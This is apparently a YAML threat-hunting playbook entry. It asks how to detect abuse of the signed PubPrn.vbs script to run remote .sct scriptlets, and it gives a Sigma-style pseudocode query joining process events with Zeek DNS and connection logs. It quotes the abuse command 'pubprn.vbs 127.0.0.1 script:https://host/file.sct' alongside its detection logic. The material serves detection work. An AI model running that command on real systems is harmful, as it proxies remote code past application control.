questions:
- question: '[Stealth] Trace remote scriptlet URLs: Can you determine whether a cscript.exe or wscript.exe
    invocation of pubprn.vbs includes the `script:` moniker and a remote URL, and the destination domain
    or IP is visible in DNS or connection telemetry for validation against reputation and first-seen exposure.
    -- specifically, using the ''Trace remote scriptlet URLs'' (Symbolic Logic) approach?'
  context: 'Why this matters: Under the Stealth tactic (TA0005), the information requirement is: "Is the
    adversary using PubPrn.vbs to execute remote code and evade defenses? (TA0005 - Defense Evasion)".
    PubPrn.vbs is a Microsoft-signed Visual Basic script for publishing printers to Active Directory;
    adversaries abuse it as a signed LOLBin to proxy execution of a remote .sct scriptlet via the ''script:''
    moniker, bypassing signature validation and application control. On Windows 10+ the script is restricted
    to ''LDAP://'', so a ''script:'' handler referencing remote code is high-fidelity abuse. This evidence
    focuses on the condition that a cscript.exe or wscript.exe invocation of pubprn.vbs includes the `script:`
    moniker and a remote URL, and the destination domain or IP is visible in DNS or connection telemetry
    for validation against reputation and first-seen exposure. This Symbolic Logic approach proceeds as
    follows: On Windows Event ID 4688 / Sysmon EID 1, match cscript.exe or wscript.exe command lines that
    contain BOTH `\pubprn.vbs` AND `script:` while NOT containing `ldap:` (the only legitimate second-parameter
    protocol on Windows 10+), per the deterministic [Pubprn.vbs Proxy Execution Sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml)
    and the documented abuse pattern `pubprn.vbs 127.0.0.1 script:https://host/file.sct` in the [PubPrn
    LOLBAS entry](https://lolbas-project.github.io/lolbas/Scripts/Pubprn/) and [WSH Injection case study](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/).
    Extract host, path, and protocol, then correlate the resolved domain and destination IP in Zeek dns.log/conn.log
    and alert when the destination is in threat intelligence or inconsistent with normal publishing infrastructure
    ([MITRE T1216.001](https://attack.mitre.org/techniques/T1216/001/)). A positive result -- a rule match,
    statistical outlier, or model alert -- indicates likely PubPrn proxy execution of remote code and
    should be triaged by pivoting to the executing user/host, process lineage, the ''script:'' destination,
    and any payload retrieval. A negative result helps reduce suspicion for this vector but should be
    corroborated with the other questions in this playbook, since signed-binary LOLBin abuse is stealthy
    by design.'
  answer_sources:
  - Windows Event ID 4688
  - Zeek conn.log
  - Zeek dns.log
  - 'NAI: Endpoint devices (workstations and servers), Enterprise DNS resolvers, Network egress points
    (e.g., firewalls, proxies)'
  range: Last 90 days
  queries:
  - technology: Zeek/pseudocode
    query: '# Trace remote scriptlet URLs

      source IN [Windows Event ID 4688, Zeek conn.log, Zeek dns.log]

      filter Image IN (''cscript.exe'',''wscript.exe'') AND CommandLine CONTAINS ''pubprn.vbs''

      where CommandLine MATCHES ''script:'' AND CommandLine NOT MATCHES ''ldap:''

      extract host, path, protocol FROM CommandLine

      | join Zeek dns.log/conn.log ON resolved_domain, dest_ip

      alert when dest IN threat_intel OR dest NOT IN known_publishing_infra'
